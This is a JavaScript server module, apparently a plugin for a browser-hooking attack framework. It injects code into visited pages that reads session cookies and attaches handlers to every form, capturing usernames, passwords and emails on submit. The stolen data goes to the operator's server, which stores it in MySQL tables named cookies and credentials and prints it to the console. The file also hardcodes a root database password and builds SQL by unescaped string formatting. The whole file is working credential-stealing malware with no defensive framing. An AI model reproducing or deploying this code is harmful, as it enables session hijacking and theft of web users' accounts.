let mysql = require("mysql");
let util = require("util");

let con;

module.exports = (M) => {

	M.setDefaultConfig({
		dbHost: "localhost",
		dbLogin: "root",
		dbPass: "1Qetuoadgjl!",
		dbName: "FuseBase",
		cookieTable: "cookies",
		credsTable: "credentials"
	});

	M.setMainFunction((module, socket, config) => {

		socket.on("creds", (password, email, text, url, host) => {
			con.query(
				util.format(
					"INSERT INTO " + M.config.credsTable + "(`username`, `password`, `email`, `website`, `url`) VALUES(`%s`, `%s`, `%s`, `%s`, `%s`);",
					text[0],
					password,
					email,
					host,
					url
			), () => {
					console.log("New credentials logged: " + (email || text[0]) + ":" + password + "@" + url)
			});
		});

		let c = () => {
			M.executeRemoteFuncFromThisModule(socket, "stealCookies", "", (out) => {
				out[0].split("; ").forEach((cookie) => {
					if (cookie != "") {
						let ck = cookie.split("=");
						con.query(
							util.format(
								"INSERT INTO " + M.config.cookieTable + "(`key`, `value`, `website`, `url`) VALUES(`%s`, `%s`, `%s`, `%s`);",
								ck[0],
								ck[1],
								out[1],
								out[2]
						), () => {
							console.log("New cookie logged: " + cookie + "@" + out[2]);
						});
					}
				});
			});

			M.executeRemoteFuncFromThisModule(socket, "hookForm", "");
		};

		if (!con) {
			con = mysql.createConnection({
				host: M.config.dbHost,
				user: M.config.dbLogin,
				password: M.config.dbPass
			});

			con.query("CREATE DATABASE IF NOT EXISTS " + M.config.dbName, () => {
				con.query(`CREATE TABLE IF NOT EXISTS ` + M.config.cookieTable + ` (
					\`id\` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
					\`key\` STRING NOT NULL,
					\`value\` STRING NOT NULL,
					\`website\` STRING NOT NULL,
					\`url\` STRING NOT NULL
					);
				`, () => {
						con.query(`CREATE TABLE IF NOT EXISTS ` + M.config.credsTable + ` (
						\`id\` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
						\`username\` STRING NOT NULL,
						\`password\` STRING NOT NULL,
						\`email\` STRING NOT NULL,
						\`website\` STRING NOT NULL,
						\`url\` STRING NOT NULL
						);                        
					`, c);
					});
			});
		} else {
			c();
		}
	})

	M.addRemoteFunction("stealCookies", function (args, debug) {
		return [document.cookie, document.location.host, document.location.href];
	});

	M.addRemoteFunction("hookForm", function (args, debug) {
		let forms = document.getElementsByTagName("form");

		let c = (form) => {
			let password;
			let text = [];
			let email;

			let inputs = form.getElementsByTagName("input");

			for (let i = 0; i < inputs.length; i++) {
				const e = inputs.item(i);
				if (e.type === "text") {
					text.push(e.value);
				} else if (e.type === "password") {
					password = e.value;
				} else if (e.type === "email") {
					email = e.value;
				}
			}

			socket.emit("creds", password, email, text, document.location.href, document.location.host);
		};

		for (let i = 0; i < forms.length; i++) {
			const form = forms.item(i);

			form.onsubmit = c.bind(window, form);
		}
	});

	M.setAutoRunStatus(true);

	return M;
}